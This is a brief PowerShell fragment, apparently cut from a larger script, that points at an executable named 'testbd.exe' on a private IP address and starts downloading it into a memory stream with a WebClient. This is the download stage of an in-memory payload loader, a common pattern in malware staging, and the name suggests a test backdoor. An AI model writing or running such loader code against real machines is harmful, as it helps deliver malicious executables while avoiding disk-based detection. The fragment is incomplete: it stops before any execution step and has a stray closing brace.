$url = 'http://172.22.239.186:8000/testbd.exe';

$wClient = New-Object System.Net.WebClient;
$memStream = New-Object System.IO.MemoryStream;

$wClient.DownloadDataAsync($url, $memStream);

}